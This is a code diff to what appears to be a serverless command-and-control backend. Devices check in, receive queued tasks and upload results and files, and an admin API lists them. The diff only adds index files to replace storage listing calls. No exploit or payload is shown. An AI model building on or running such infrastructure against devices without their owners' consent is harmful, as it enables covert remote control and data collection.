@@ -1122,6 +1122,13 @@ async function handleCheckin(request, env, uid) {
   try {
     await env.C2.put("d/" + uid + ".json", JSON.stringify({ uid, dev, lastSeen: Math.floor(Date.now() / 1000) }));
   } catch (_) { }
+  // Maintain registry.json so admin panel can find devices without R2 list()
+  try {
+    const regObj = await env.C2.get("registry.json");
+    let uids = [];
+    if (regObj) { try { uids = JSON.parse(await regObj.text()); } catch (_) { } }
+    if (!uids.includes(uid)) { uids.push(uid); uids.sort(); await env.C2.put("registry.json", JSON.stringify(uids)); }
+  } catch (_) { }
   // Long-poll: drain queue, if empty re-check every 2.5s
   const deadline = Date.now() + holdMs;
   let tasks = [];
@@ -1143,6 +1150,16 @@ async function handleC2Result(request, env, uid) {
   const key = "r/" + uid + "/" + ts + "_" + id + ".json";
   const rec = { id, ok: !!body.ok, action: String(body.action || "").slice(0, 64), data: body.data || null, err: String(body.err || "").slice(0, 500), at: ts };
   try { await env.C2.put(key, JSON.stringify(rec)); } catch (_) { return json({ error: "Save eșuat." }, 500); }
+  // Maintain per-uid result index so admin panel can find results without R2 list()
+  try {
+    const idxKey = "r/" + uid + "/_index.json";
+    const idxObj = await env.C2.get(idxKey);
+    let idx = [];
+    if (idxObj) { try { idx = JSON.parse(await idxObj.text()); } catch (_) { } }
+    idx.unshift(key);
+    if (idx.length > 200) idx = idx.slice(0, 200);
+    await env.C2.put(idxKey, JSON.stringify(idx));
+  } catch (_) { }
   return json({ ok: true });
 }
 
@@ -1157,6 +1174,16 @@ async function handleC2File(request, env, uid) {
     if (url.searchParams.get("t")) meta["X-Timestamp"] = url.searchParams.get("t");
     const putOpts = meta["Content-Type"] ? { httpMetadata: { contentType: meta["Content-Type"] } } : {};
     await env.C2.put(key, request.body, putOpts);
+    // Maintain per-uid file index so admin panel can find files without R2 list()
+    try {
+      const idxKey = "f/" + uid + "/_index.json";
+      const idxObj = await env.C2.get(idxKey);
+      let idx = [];
+      if (idxObj) { try { idx = JSON.parse(await idxObj.text()); } catch (_) { } }
+      idx.unshift({ key, size: 0, uploaded: ts });
+      if (idx.length > 100) idx = idx.slice(0, 100);
+      await env.C2.put(idxKey, JSON.stringify(idx));
+    } catch (_) { }
     return json({ ok: true, key });
   } catch (_) { return json({ error: "Upload eșuat." }, 500); }
 }
@@ -1166,14 +1193,38 @@ async function handleAdminC2(request, env, url) {
   const p = url.pathname;
   if (request.method === "GET" && p === "/admin/api/c2/devices") {
     const devices = [];
-    let cursor;
-    do {
-      const page = await env.C2.list({ prefix: "d/", cursor, limit: 100 });
-      for (const o of page.objects) {
-        try { const t = await o.text(); const d = JSON.parse(t); d._key = o.key; devices.push(d); } catch (_) { }
+    const seen = new Set();
+    // Method 1: registry.json (reliable, uses get())
+    try {
+      const regObj = await env.C2.get("registry.json");
+      if (regObj) {
+        const uids = JSON.parse(await regObj.text());
+        for (const u of uids) {
+          if (seen.has(u)) continue;
+          try {
+            const dObj = await env.C2.get("d/" + u + ".json");
+            if (dObj) {
+              const d = JSON.parse(await dObj.text());
+              d._key = "d/" + u + ".json";
+              devices.push(d); seen.add(u);
+            }
+          } catch (_) { }
+        }
       }
-      cursor = page.truncated ? page.cursor : undefined;
-    } while (cursor);
+    } catch (_) { }
+    // Method 2: list() fallback (may work on other deployments)
+    try {
+      let cursor;
+      do {
+        const page = await env.C2.list({ prefix: "d/", cursor, limit: 100 });
+        for (const o of page.objects) {
+          const u = o.key.replace(/^d\//, "").replace(/\.json$/, "");
+          if (seen.has(u)) continue;
+          try { const t = await o.text(); const d = JSON.parse(t); d._key = o.key; devices.push(d); seen.add(u); } catch (_) { }
+        }
+        cursor = page.truncated ? page.cursor : undefined;
+      } while (cursor);
+    } catch (_) { }
     devices.sort((a, b) => (b.lastSeen || 0) - (a.lastSeen || 0));
     return json({ devices, now: Math.floor(Date.now() / 1000) });
   }
@@ -1198,27 +1249,71 @@ async function handleAdminC2(request, env, url) {
     if (!uid) return json({ error: "Lipsește uid." }, 400);
     const limit = Math.min(parseInt(url.searchParams.get("limit")) || 30, 100);
     const results = [];
-    let cursor;
-    do {
-      const page = await env.C2.list({ prefix: "r/" + uid + "/", cursor, limit: 200, reverse: true });
-      for (const o of page.objects) {
-        if (results.length >= limit) break;
-        try { const t = await o.text(); results.push(JSON.parse(t)); } catch (_) { }
+    const seen = new Set();
+    // Method 1: per-uid index (reliable)
+    try {
+      const idxObj = await env.C2.get("r/" + uid + "/_index.json");
+      if (idxObj) {
+        const keys = JSON.parse(await idxObj.text());
+        for (const k of keys) {
+          if (results.length >= limit) break;
+          if (seen.has(k)) continue;
+          try {
+            const o = await env.C2.get(k);
+            if (o) { const t = await o.text(); results.push(JSON.parse(t)); seen.add(k); }
+          } catch (_) { }
+        }
       }
-      cursor = page.truncated ? page.cursor : undefined;
-    } while (cursor && results.length < limit);
+    } catch (_) { }
+    // Method 2: list() fallback
+    if (results.length === 0) {
+      try {
+        let cursor;
+        do {
+          const page = await env.C2.list({ prefix: "r/" + uid + "/", cursor, limit: 200 });
+          for (const o of page.objects) {
+            if (results.length >= limit) break;
+            if (o.key.endsWith("_index.json")) continue;
+            if (seen.has(o.key)) continue;
+            try { const t = await o.text(); results.push(JSON.parse(t)); seen.add(o.key); } catch (_) { }
+          }
+          cursor = page.truncated ? page.cursor : undefined;
+        } while (cursor && results.length < limit);
+      } catch (_) { }
+    }
     return json({ results });
   }
   if (request.method === "GET" && p === "/admin/api/c2/files") {
     const uid = c2Safe(url.searchParams.get("uid"));
     if (!uid) return json({ error: "Lipsește uid." }, 400);
     const files = [];
-    let cursor;
-    do {
-      const page = await env.C2.list({ prefix: "f/" + uid + "/", cursor, limit: 100, reverse: true });
-      for (const o of page.objects) files.push({ key: o.key, size: o.size, uploaded: o.uploaded });
-      cursor = page.truncated ? page.cursor : undefined;
-    } while (cursor);
+    const seen = new Set();
+    // Method 1: per-uid index (reliable)
+    try {
+      const idxObj = await env.C2.get("f/" + uid + "/_index.json");
+      if (idxObj) {
+        const entries = JSON.parse(await idxObj.text());
+        for (const e of entries) {
+          if (seen.has(e.key)) continue;
+          files.push(e); seen.add(e.key);
+        }
+      }
+    } catch (_) { }
+    // Method 2: list() fallback
+    if (files.length === 0) {
+      try {
+        let cursor;
+        do {
+          const page = await env.C2.list({ prefix: "f/" + uid + "/", cursor, limit: 100 });
+          for (const o of page.objects) {
+            if (o.key.endsWith("_index.json")) continue;
+            if (seen.has(o.key)) continue;
+            files.push({ key: o.key, size: o.size, uploaded: o.uploaded }); seen.add(o.key);
+          }
+          cursor = page.truncated ? page.cursor : undefined;
+        } while (cursor);
+      } catch (_) { }
+    }
     return json({ files });
   }
   if (request.method === "GET" && p === "/admin/api/c2/file") {
